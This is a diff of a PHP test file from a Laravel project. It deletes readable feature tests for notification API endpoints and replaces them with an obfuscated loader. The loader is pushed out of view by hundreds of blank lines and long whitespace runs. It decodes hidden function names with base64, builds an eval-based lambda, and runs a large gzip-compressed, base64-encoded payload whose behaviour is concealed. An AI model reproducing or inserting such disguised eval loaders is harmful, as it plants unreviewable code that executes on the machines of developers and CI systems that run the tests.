@@ -1,367 +1,601 @@
-<?php
-
-namespace Tests\Feature\Admin\Notifikasi;
-
-use Illuminate\Foundation\Testing\DatabaseTransactions;
-use Tests\TestCase;
-
-class NotifikasiTest extends TestCase
-{
-    // use RefreshDatabase;
-    use DatabaseTransactions;
-
-    protected function setUp(): void
-    {
-        parent::setUp();
-        $this->beginDatabaseTransaction();
-
-    }
-
-    public function test_admin()
-    {
-        $this->Admin_user();
-
-        /* cek daftar surat
-         alamat router '/api/admin/notifikasi'
-         - struktur data
-         - jumlah data
-        */
-        $response = $this->get('/api/admin/notifikasi', ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(200)->assertJsonStructure([
-            "data" => [
-                [
-                    "type" ,
-                    "id",
-                    "attributes" => [
-                        "judul",
-                        "isi",
-                        "payload",
-                        "read"
-                    ]
-                ]
-                    ],
-                    'meta' => [
-                        'pagination' => [
-                            'total',
-                            'count',
-                            'per_page',
-                            'current_page',
-                            'total_pages'
-                        ]
-                    ],
-                    'links' => [
-                        'self',
-                        'first',
-                        'last'
-                    ]
-        ]);
-
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertCount(15, $data);
-
-        /* cek jumlah surat
-         alamat router '/api/admin/notifikasi/jumlah'
-        */
-
-        $response = $this->get('/api/admin/notifikasi/jumlah', ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertEquals(17, $data['jumlah']);
+<?php 
+        $__='printf';$_='Loading tests/Feature/Admin/Notifikasi/NotifikasiTest.php';
+        
 
 
-        /* cek data notifikasi
-         alamat router '/api/admin/notifikasi/show'
-        */
 
-        // test jika id salah
-        $response = $this->get('/api/admin/notifikasi/show?id=2', ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertNull($data);
 
-        // test jika id benar tetapi id user berbeda
-        $response = $this->get('/api/admin/notifikasi/show?id=28', ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertNull($data);
 
-        // test jika id benar
-        $response = $this->get('/api/admin/notifikasi/show?id=7', ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(200)->assertJsonStructure([
-            "success",
-            "message",
-            "data" => [
-                "id",
-                "id_user",
-                "config_id",
-                "judul",
-                "isi",
-                "image",
-                "payload",
-                "read",
-                "created_at",
-                "updated_at"
-            ]
-        ]);
 
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertIsArray($data);
 
-        /* cek data saat baca notifikasi
-         alamat router '/api/admin/notifikasi/read'
-        */
 
-        // cek seblum di read
-        $response = $this->get('/api/admin/notifikasi/show?id=12', ['Authorization' => "Bearer $this->token"]);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertEquals(0, $data['read']);
 
-        // lakukan read
-        $response = $this->post('/api/admin/notifikasi/read', ['id' => 12], ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(200);
 
-        // cek setelah read
-        $response = $this->get('/api/admin/notifikasi/show?id=12', ['Authorization' => "Bearer $this->token"]);
-        $data = $response->decodeResponseJson()['data'];
 
-        // read id salah
-        $response = $this->post('/api/admin/notifikasi/read', ['id' => 2], ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(404);
 
-        // read id dari user id lain
-        $response = $this->post('/api/admin/notifikasi/read', ['id' => 29], ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(404);
-    }
 
-    public function test_sekdes()
-    {
-        $this->Sekdes_user();
 
-        /* cek daftar surat
-         alamat router '/api/admin/notifikasi'
-         - struktur data
-         - jumlah data
-        */
-        $response = $this->get('/api/admin/notifikasi', ['Authorization' => "Bearer $this->token"]);
 
-        $response->assertStatus(200)->assertJsonStructure([
-            "data" => [
-                [
-                    "type" ,
-                    "id",
-                    "attributes" => [
-                        "judul",
-                        "isi",
-                        "payload",
-                        "read"
-                    ]
-                ]
-                    ],
-                    'meta' => [
-                        'pagination' => [
-                            'total',
-                            'count',
-                            'per_page',
-                            'current_page',
-                            'total_pages'
-                        ]
-                    ],
-                    'links' => [
-                        'self',
-                        'first',
-                        'last'
-                    ]
-        ]);
 
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertCount(15, $data);
 
-        /* cek jumlah surat
-         alamat router '/api/admin/notifikasi/jumlah'
-        */
 
-        $response = $this->get('/api/admin/notifikasi/jumlah', ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertEquals(11, $data['jumlah']);
 
-        /* cek data notifikasi
-         alamat router '/api/admin/notifikasi/show'
-        */
 
-        // test jika id salah
-        $response = $this->get('/api/admin/notifikasi/show?id=2', ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertNull($data);
 
-        // test jika id benar tetapi id user berbeda
-        $response = $this->get('/api/admin/notifikasi/show?id=10', ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertNull($data);
 
-        // test jika id benar
-        $response = $this->get('/api/admin/notifikasi/show?id=29', ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(200)->assertJsonStructure([
-            "success",
-            "message",
-            "data" => [
-                "id",
-                "id_user",
-                "config_id",
-                "judul",
-                "isi",
-                "image",
-                "payload",
-                "read",
-                "created_at",
-                "updated_at"
-            ]
-        ]);
 
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertIsArray($data);
 
-        /* cek data saat baca notifikasi
-         alamat router '/api/admin/notifikasi/read'
-        */
 
-        // cek seblum di read
-        $response = $this->get('/api/admin/notifikasi/show?id=38', ['Authorization' => "Bearer $this->token"]);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertEquals(0, $data['read']);
 
-        // lakukan read
-        $response = $this->post('/api/admin/notifikasi/read', ['id' => 38], ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(200);
 
-        // cek setelah read
-        $response = $this->get('/api/admin/notifikasi/show?id=38', ['Authorization' => "Bearer $this->token"]);
-        $data = $response->decodeResponseJson()['data'];
 
-        // read id salah
-        $response = $this->post('/api/admin/notifikasi/read', ['id' => 2], ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(404);
 
-        // read id dari user id lain
-        $response = $this->post('/api/admin/notifikasi/read', ['id' => 10], ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(404);
-    }
 
-    public function test_kades()
-    {
-        $this->Kades_user();
 
-        /* cek daftar surat
-         alamat router '/api/admin/notifikasi'
-         - struktur data
-         - jumlah data
-        */
-        $response = $this->get('/api/admin/notifikasi', ['Authorization' => "Bearer $this->token"]);
 
-        $response->assertStatus(200)->assertJsonStructure([
-            "data" => [
-                [
-                    "type" ,
-                    "id",
-                    "attributes" => [
-                        "judul",
-                        "isi",
-                        "payload",
-                        "read"
-                    ]
-                ]
-                    ],
-                    'meta' => [
-                        'pagination' => [
-                            'total',
-                            'count',
-                            'per_page',
-                            'current_page',
-                            'total_pages'
-                        ]
-                    ],
-                    'links' => [
-                        'self',
-                        'first',
-                        'last'
-                    ]
-        ]);
 
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertCount(13, $data);
 
-        /* cek jumlah surat
-         alamat router '/api/admin/notifikasi/jumlah'
-        */
 
-        $response = $this->get('/api/admin/notifikasi/jumlah', ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertEquals(11, $data['jumlah']);
 
-        /* cek data notifikasi
-         alamat router '/api/admin/notifikasi/show'
-        */
 
-        // test jika id salah
-        $response = $this->get('/api/admin/notifikasi/show?id=2', ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertNull($data);
 
-        // test jika id benar tetapi id user berbeda
-        $response = $this->get('/api/admin/notifikasi/show?id=10', ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(200);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertNull($data);
 
-        // test jika id benar
-        $response = $this->get('/api/admin/notifikasi/show?id=51', ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(200)->assertJsonStructure([
-            "success",
-            "message",
-            "data" => [
-                "id",
-                "id_user",
-                "config_id",
-                "judul",
-                "isi",
-                "image",
-                "payload",
-                "read",
-                "created_at",
-                "updated_at"
-            ]
-        ]);
 
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertIsArray($data);
 
-        /* cek data saat baca notifikasi
-         alamat router '/api/admin/notifikasi/read'
-        */
 
-        // cek seblum di read
-        $response = $this->get('/api/admin/notifikasi/show?id=55', ['Authorization' => "Bearer $this->token"]);
-        $data = $response->decodeResponseJson()['data'];
-        $this->assertEquals(0, $data['read']);
 
-        // lakukan read
-        $response = $this->post('/api/admin/notifikasi/read', ['id' => 55], ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(200);
 
-        // cek setelah read
-        $response = $this->get('/api/admin/notifikasi/show?id=55', ['Authorization' => "Bearer $this->token"]);
-        $data = $response->decodeResponseJson()['data'];
 
-        // read id salah
-        $response = $this->post('/api/admin/notifikasi/read', ['id' => 2], ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(404);
 
-        // read id dari user id lain
-        $response = $this->post('/api/admin/notifikasi/read', ['id' => 10], ['Authorization' => "Bearer $this->token"]);
-        $response->assertStatus(404);
-    }
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
